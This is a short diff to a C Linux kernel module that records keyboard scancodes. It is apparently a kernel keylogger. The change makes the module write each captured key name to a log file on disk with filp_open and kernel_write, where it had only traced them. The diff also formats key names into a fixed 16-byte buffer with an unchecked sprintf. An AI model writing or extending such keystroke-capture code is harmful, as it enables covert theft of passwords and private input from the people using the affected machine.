@@ -63,12 +63,18 @@ static void trace_back(void) {
 	log_node *pos;
 	log_node *tmp;
 
+	struct file *file = filp_open(LOG_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	loff_t offset = 0;
+
 	list_for_each_entry_safe(pos, tmp, &file_list, list) {
-		if (!pos->release) {
+		if (!pos->release && !IS_ERR(file)) {
+			int len;
+			char buf[16];
 			if (SPECIAL(pos->scancode))
-				TRACE_BACK("[%s]", NAME(pos->scancode));
+				len = sprintf(buf, "[%s]", NAME(pos->scancode));
 			else
-				TRACE_BACK("%s", NAME(pos->scancode));
+				len = sprintf(buf, "%s", NAME(pos->scancode));
+			kernel_write(file, buf, len, &offset);
 		}
 		kfree(pos);
 	}
@@ -87,6 +93,7 @@ static void *seq_start(struct seq_file *s, loff_t *pos) {
 	misc_open = 0;
 	return seq_list_start(&file_list, *pos);
 }
+
 static void seq_stop(struct seq_file *_s, void *_v) {}
 
 static void *ct_seq_next(struct seq_file *s, void *v, loff_t *pos) {
